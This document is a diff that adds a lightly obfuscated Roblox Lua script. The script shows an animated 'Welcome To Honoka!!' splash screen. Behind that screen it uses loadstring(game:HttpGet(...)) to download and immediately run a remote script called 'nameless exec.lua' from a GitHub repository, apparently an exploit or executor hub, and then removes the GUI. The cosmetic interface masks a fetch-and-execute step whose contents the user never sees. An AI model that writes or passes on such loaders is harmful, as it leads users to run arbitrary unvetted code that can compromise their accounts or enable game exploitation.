@@ -1,0 +1,12 @@
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.10.7) ~  Much Love, Ferib 
+
+]]--
+
+local v0=Instance.new("ScreenGui");local v1=Instance.new("Frame");local v2=Instance.new("UICorner");local v3=Instance.new("ImageLabel");local v4=Instance.new("TextLabel");v0.Name="RoundedGui";v0.Parent=game.Players.LocalPlayer:WaitForChild("PlayerGui");v1.Parent=v0;v1.BackgroundColor3=Color3.fromRGB(30,144,255);v1.Position=UDim2.new(0.5, -150,1,0);v1.Size=UDim2.new(0,300,0,200);v1.BackgroundTransparency=1;v2.CornerRadius=UDim.new(0,20);v2.Parent=v1;v3.Parent=v1;v3.Size=UDim2.new(0,100,0,100);v3.Position=UDim2.new(0.5, -50,0.5, -100);v3.AnchorPoint=Vector2.new(0.5,0);v3.BackgroundTransparency=1;v3.Image="rbxassetid://106909593768778";v3.ImageTransparency=1;v4.Parent=v1;v4.Size=UDim2.new(0,200,0,50);v4.Position=UDim2.new(0.5, -100,0.75,0);v4.BackgroundTransparency=1;v4.Text="Welcome To Honoka!!";v4.Font=Enum.Font.GothamBold;v4.TextSize=24;v4.TextColor3=Color3.fromRGB(255,0,0);v4.TextScaled=true;v4.TextTransparency=1;local function v32() v1:TweenPosition(UDim2.new(0.5, -150,0.5, -100),"Out","Quad",2,true);local v34=game:GetService("TweenService");local v35=TweenInfo.new(2,Enum.EasingStyle.Quad,Enum.EasingDirection.Out);local v36=v34:Create(v1,v35,{BackgroundTransparency=0});v36:Play();v1:TweenSize(UDim2.new(0,300,0,200),"Out","Quad",2,true);local v37=v34:Create(v3,v35,{Size=UDim2.new(0,150,0,150)});v37:Play();local v38=v34:Create(v3,v35,{ImageTransparency=0});v38:Play();local v39=v34:Create(v4,v35,{TextTransparency=0});v39:Play();wait(2);v3:TweenSize(UDim2.new(0,100,0,100),"Out","Quad",1,true);end local function v33() local v40,v41=pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Jfdedit3/New-hub/main/nameless%20exec.lua"))();end);if v40 then wait(1);v0:Destroy();print("GUI détruit après l'exécution du script.");else warn("Erreur lors de l'exécution du script : "   .. v41 );end end wait(1);v32();v33();
